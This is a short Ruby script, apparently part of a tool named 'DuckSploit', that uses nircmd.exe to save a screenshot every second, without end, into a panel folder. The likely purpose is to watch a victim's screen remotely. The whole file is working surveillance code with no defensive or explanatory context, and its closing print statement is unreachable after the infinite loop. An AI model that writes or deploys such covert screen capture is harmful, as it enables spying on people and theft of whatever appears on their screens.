require "colorize"
require "date"

filename = "last"

loop do
  system("C:/Windows/System32/nircmd.exe savescreenshot C:/$DuckSploitw/pannel/temp/#{filename}.jpg")
  sleep 1
end

puts "Saved as #{filename}.jpg".red.bold.blink
